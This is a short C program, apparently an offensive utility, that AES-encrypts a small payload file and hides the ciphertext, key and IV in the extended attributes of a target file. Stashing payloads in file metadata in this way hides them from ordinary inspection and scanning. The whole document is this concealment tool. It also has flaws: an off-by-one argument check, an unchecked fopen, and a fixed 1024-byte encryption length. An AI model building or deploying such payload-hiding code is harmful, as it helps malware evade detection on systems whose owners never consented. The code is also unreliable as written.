#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/xattr.h>

#include "aes.h"

int main(int argc, char **argv)
{
    struct AES_ctx ctx; 
    FILE                *fd;
    int                  sz;
    char        payol[1024];
    char  *attr0 = "user.0";
    char  *attr1 = "user.1";
    char  *attr2 = "user.2";

    if(argc < 4)
    {
        printf("%s - <code file> <key> <iv> <target file>\n",argv[0]);
        exit(1);
    }
     
    if((strlen(argv[2]) != 16) || (strlen(argv[3]) != 16))
    {
        printf("Key and IV must be 16 characters each exactly!\n"); 
        exit(1); 
    }

    fd = fopen(argv[1], "rb"); 
    fseek(fd, 0L, SEEK_END);
    sz = ftell(fd);
    fseek(fd, 0L, SEEK_SET);
    if(sz > 1024)
    {
        printf("FATAL: code file too large\n");
        exit(1);
    }    
    fread(payol, 1, sz, fd);

    AES_init_ctx_iv(&ctx, (uint8_t *)argv[2], (uint8_t *)argv[3]);
    AES_CBC_encrypt_buffer(&ctx, (uint8_t *)payol, 1024);

    setxattr(argv[4], attr0, argv[2], strlen(argv[2]), 0);  // key
    setxattr(argv[4], attr1, argv[3], strlen(argv[3]), 0);  // iv
    setxattr(argv[4], attr2, payol, 1024, 0);               // payload

    return 0; 
}

